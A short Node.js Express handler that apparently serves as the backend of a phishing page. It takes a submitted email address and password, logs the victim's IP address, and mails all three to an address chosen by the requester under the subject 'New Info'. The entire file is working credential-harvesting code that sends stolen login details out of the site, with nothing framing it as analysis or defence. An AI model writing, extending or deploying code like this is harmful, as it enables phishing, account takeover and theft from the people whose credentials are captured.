const { mailer } = require("../utils/mailer");

const processSubmission = async (req, res) => {
  const { mail, password, email } = req.body;

  const origin = req.connection.remoteAddress;
  if (origin) {
    console.log(origin);
  } else {
    console.log("Origin header not present in the request");
  }

  const subject = "New Info";

  try {
    let message = "";

    if (mail && password) {
      message = `Email: ${mail} Pass1: ${password} Origin: ${origin}`;
    }

    await mailer(email, message, subject);

    res.status(200).json({ message: "Message Sent" });
  } catch (error) {
    console.error("Error processing submission:", error);
    res.status(500).json({ message: "Internal Server Error" });
  }
};

module.exports = { processSubmission };
